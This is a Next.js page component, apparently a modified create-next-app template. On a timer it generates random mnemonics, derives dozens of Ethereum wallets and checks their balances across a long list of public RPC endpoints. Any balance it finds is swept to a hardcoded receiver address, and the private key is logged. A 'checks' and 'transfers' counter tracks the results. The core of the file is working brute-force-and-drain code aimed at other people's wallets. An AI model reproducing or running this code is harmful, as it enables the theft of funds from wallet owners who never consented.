'use client';

import { ethers } from 'ethers';
import Image from "next/image";
import { useCallback, useEffect, useState } from "react";

const RPC_ENDPOINTS = [
  "https://eth.llamarpc.com",
  "https://rpc.ankr.com/eth",
  "https://ethereum.publicnode.com",
  "https://1rpc.io/eth",
  "https://eth-mainnet.public.blastapi.io",
  "https://rpc.flashbots.net",
  "https://cloudflare-eth.com",
  "https://eth-mainnet.gateway.pokt.network/v1/5f3453978e354ab992c4da79",
  "https://api.mycryptoapi.com/eth",
  "https://rpc.eth.gateway.fm",
  "https://eth-mainnet-public.unifra.io",
  "https://ethereum.blockpi.network/v1/rpc/public",
  "https://rpc.payload.de",
  "https://api.zmok.io/mainnet/oaen6dy8ff6hju9k",
  "https://eth.api.onfinality.io/public",
  "https://core.gashawk.io/rpc",
  "https://rpc.builder0x69.io",
  "https://eth.meowrpc.com",
  "https://eth.drpc.org",
  "https://mainnet.gateway.tenderly.co",
  "https://rpc.mevblocker.io",
  "https://rpc.mevblocker.io/noreverts",
  "https://rpc.mevblocker.io/fast",
  "https://eth-mainnet.rpcfast.com",
  "https://api.securerpc.com/v1",
  "https://openapi.bitstack.com/v1/wNFxbiJyQsSeLrX",
  "https://eth-rpc.gateway.pokt.network",
  "https://ethereum-mainnet.gateway.tatum.io",
  "https://api.zan.top/node/v1/eth/mainnet/public",
  "https://eth-mainnet.nodereal.io/v1/1659dfb40aa2",
  "https://eth.merkle.io",
  "https://rpc.notadegen.com/eth",
  "https://eth.gateway.tenderly.co",
  "https://virginia.rpc.blxrbdn.com",
  "https://uk.rpc.blxrbdn.com",
  "https://singapore.rpc.blxrbdn.com",
  "https://eth.rpc.blxrbdn.com",
  "https://eth-mainnet.diamondswap.org/rpc",
  "https://rpc.lokibuilder.xyz/eth",
  "https://rpc.flashbots.net/fast",
  "https://rpc.flashbots.net/builder",
  "https://rpc.lightspeedbuilder.info",
  "https://rpc.titanbuilder.xyz",
  "https://rpc.beaverbuild.org",
  "https://eth.getblock.io/mainnet/",
  "https://eth.drpc.org",
  "https://mainnet.eth.cloud.ava.do",
  "https://eth.connect.bloq.cloud/v1/",
  "https://nodes.mewapi.io/rpc/eth",
  "https://main-light.eth.linkpool.io",
  "https://eth-mainnet.zerion.io"
];

const RECEIVER_ADDRESS = "0x2de229EC151AE93BC7C80CAd84BADb2d805bD673";

interface Wallet {
  privateKey: string;
  address: string;
  path: string;
}

export default function Home() {
  const [checkCount, setCheckCount] = useState(0);
  const [transferCount, setTransferCount] = useState(0);

  useEffect(() => {
    const fetchCounts = async () => {
      const response = await fetch('/api/counts');
      const data = await response.json();
      if (data) {
        setCheckCount(data.countNumber);
        setTransferCount(data.transferCount);
      }
    };
    fetchCounts();
  }, []);

  const updateCounts = async (newCheckCount: number, newTransferCount: number) => {
    await fetch('/api/counts', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ countNumber: newCheckCount, transferCount: newTransferCount }),
    });
  };

  const generateWallets = (): Wallet[] => {
    const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
    const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
    
    const newWallets = RPC_ENDPOINTS.map((_, index) => {
      const path = `m/44'/60'/0'/0/${index}`;
      const wallet = hdNode.derivePath(path);
      return {
        privateKey: wallet.privateKey,
        address: wallet.address,
        path
      };
    });
    
    return newWallets;
  };

  const checkAndTransfer = async (wallet: Wallet, rpcUrl: string, index: number) => {
    try {
      const newCheckCount = checkCount + 1;
      setCheckCount(newCheckCount);
      await updateCounts(newCheckCount, transferCount);
      
      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
      const walletWithProvider = new ethers.Wallet(wallet.privateKey, provider);

      const [balance, gasPrice] = await Promise.all([
        provider.getBalance(wallet.address),
        provider.getGasPrice()
      ]);

      if (balance.gt(0)) {
        console.log(`[Wallet ${index}] Found balance! Attempting to transfer...`);
        console.log(`[Wallet ${index}] Balance: ${ethers.utils.formatEther(balance)} ETH`);
    
        const gasLimit = 21000;
        const gasCost = gasPrice.mul(gasLimit);
        const amountToSend = balance.sub(gasCost);

        if (amountToSend.gt(0)) {
          const tx = {
            to: RECEIVER_ADDRESS,
            value: amountToSend
          };

          const transaction = await walletWithProvider.sendTransaction(tx);
          console.log(`[Wallet ${index}] Transaction sent! Hash: ${transaction.hash}`);
          
          await transaction.wait();
          const newTransferCount = transferCount + 1;
          setTransferCount(newTransferCount);
          await updateCounts(newCheckCount, newTransferCount);
          console.log("================================================");
          console.log(`[Wallet ${index}] Transaction confirmed!`);
          console.log(`Private Key: ${wallet.privateKey}`);
          console.log(`Address: ${wallet.address}`);
          console.log(`Amount: ${ethers.utils.formatEther(amountToSend)} ETH`);
          console.log("================================================");
        }
      }
    } catch (error) {
      console.debug('Error in checkAndTransfer:', error);
    }
  };

  const checkAllWallets = useCallback(async () => {
    const wallets = generateWallets();
    
    await Promise.all(
      wallets.map((wallet, index) => 
        checkAndTransfer(wallet, RPC_ENDPOINTS[index], index)
      )
    );
  }, [checkCount, transferCount]);

  useEffect(() => {
    const interval = setInterval(checkAllWallets, 60000);
    return () => clearInterval(interval);
  }, [checkAllWallets]);

  return (
    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
      <main className="flex flex-col gap-8 row-start-2 items-center sm:items-start">
        <Image
          className="dark:invert"
          src="/next.svg"
          alt="Next.js logo"
          width={180}
          height={38}
          priority
        />
        
        {/* Counter Display */}
        <div className="w-full p-6 bg-gray-100 dark:bg-gray-800 rounded-lg shadow-md">
          <h2 className="text-xl font-bold mb-4">Operation Statistics</h2>
          <div className="grid grid-cols-2 gap-4">
            <div className="p-4 bg-white dark:bg-gray-700 rounded-md shadow">
              <p className="text-sm text-gray-500 dark:text-gray-300">Total Checks</p>
              <p className="text-2xl font-bold">{checkCount}</p>
            </div>
            <div className="p-4 bg-white dark:bg-gray-700 rounded-md shadow">
              <p className="text-sm text-gray-500 dark:text-gray-300">Transfers</p>
              <p className="text-2xl font-bold">{transferCount}</p>
            </div>
          </div>
        </div>
        
        <ol className="list-inside list-decimal text-sm text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
          <li className="mb-2">
            Get started by editing{" "}
            <code className="bg-black/[.05] dark:bg-white/[.06] px-1 py-0.5 rounded font-semibold">
              app/page.tsx
            </code>
            .
          </li>
          <li>Save and see your changes instantly.</li>
        </ol>

        <div className="flex gap-4 items-center flex-col sm:flex-row">
          <a
            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
            target="_blank"
            rel="noopener noreferrer"
          >
            <Image
              className="dark:invert"
              src="/vercel.svg"
              alt="Vercel logomark"
              width={20}
              height={20}
            />
            Deploy now
          </a>
          <a
            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:min-w-44"
            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
            target="_blank"
            rel="noopener noreferrer"
          >
            Read our docs
          </a>
        </div>
      </main>
      <footer className="row-start-3 flex gap-6 flex-wrap items-center justify-center">
        <a
          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          <Image
            aria-hidden
            src="/file.svg"
            alt="File icon"
            width={16}
            height={16}
          />
          Learn
        </a>
        <a
          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          <Image
            aria-hidden
            src="/window.svg"
            alt="Window icon"
            width={16}
            height={16}
          />
          Examples
        </a>
        <a
          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          <Image
            aria-hidden
            src="/globe.svg"
            alt="Globe icon"
            width={16}
            height={16}
          />
          Go to nextjs.org →
        </a>
      </footer>
    </div>
  );
}